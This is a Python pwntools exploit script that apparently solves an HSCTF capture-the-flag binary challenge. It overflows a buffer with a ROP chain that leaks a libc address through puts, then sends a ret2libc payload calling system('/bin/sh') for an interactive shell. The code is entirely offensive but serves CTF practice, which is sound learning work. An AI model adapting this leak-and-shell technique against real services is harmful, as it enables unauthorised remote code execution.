from pwn import *
from binascii import hexlify

p = remote("pwn.hsctf.com", 5005)
# p = process("./pwn")
e = ELF("./pwn")
libc = ELF("./libc6_2.27-3ubuntu1_amd64.so")

eat = 0x004007e7
zzz = 0x00400801
main = 0x00400846
pop_rdi = 0x00000000004009f3
ret = 0x0000000000400285


payload = bytes(cyclic(cyclic_find('faaa')),'utf-8')

payload += p64(pop_rdi)
payload += p64(e.got[b'puts'])
payload += p64(e.plt[b'puts'])
payload += p64(eat)
payload += p64(zzz)
payload += p64(e.symbols[b'main'])

print(p.recv())

p.sendline(payload)

print(p.recv().split())
# p.recv()
# print(p.recv().split())
m = p.recv().split()
print(m)
addr = m[8][::-1]
print(hexlify(addr))
addr = int(hexlify(addr), 16)


libc.address = addr - libc.symbols[b'puts']
system = libc.symbols[b'system']
bin_sh = next(libc.search(b"/bin/sh"))

print("Libc base: {}".format(hex(libc.address)))
print("Libc system: {}".format(hex(system)))
print("Libc bin_sh: {}".format(hex(bin_sh)))

payload = bytes(cyclic(cyclic_find('faaa')),'utf-8')
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(ret)
payload += p64(system)

input("debug")

p.sendline(payload)

p.interactive()